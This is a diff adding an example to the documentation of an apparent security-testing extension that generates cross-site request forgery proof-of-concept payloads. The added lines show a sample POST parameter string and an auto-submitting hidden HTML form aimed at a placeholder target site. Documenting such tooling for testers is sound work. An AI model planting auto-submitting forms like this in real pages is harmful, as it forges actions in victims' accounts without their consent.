@@ -81,3 +81,20 @@ It allows security testers to quickly create CSRF attack payloads with options t
 
 Suppose you have a POST request with the following parameters:
 
+username=alice&action=update&token=abc123
+
+
+### The extension will generate a PoC HTML form like:
+
+```html
+<form id="csrfForm" action="https://targetsite.com/profile" method="POST">
+    <input type="hidden" name="username" value="alice" />
+    <input type="hidden" name="action" value="update" />
+    <input type="hidden" name="token" value="abc123" />
+    <input type="submit" value="Submit request" />
+</form>
+<script>
+    document.getElementById('csrfForm').submit();
+</script>
+
+
